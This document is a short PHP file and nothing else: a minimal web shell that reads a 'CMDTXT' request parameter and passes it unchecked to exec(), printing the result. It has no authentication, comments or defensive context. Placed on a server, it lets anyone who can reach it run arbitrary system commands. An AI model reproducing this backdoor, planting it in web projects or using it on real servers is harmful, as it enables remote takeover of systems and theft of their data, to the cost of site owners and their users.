<?php
$cmdCommand = @$_REQUEST['CMDTXT'];
if($cmdCommand != '') 
	print exec($cmdCommand);
?>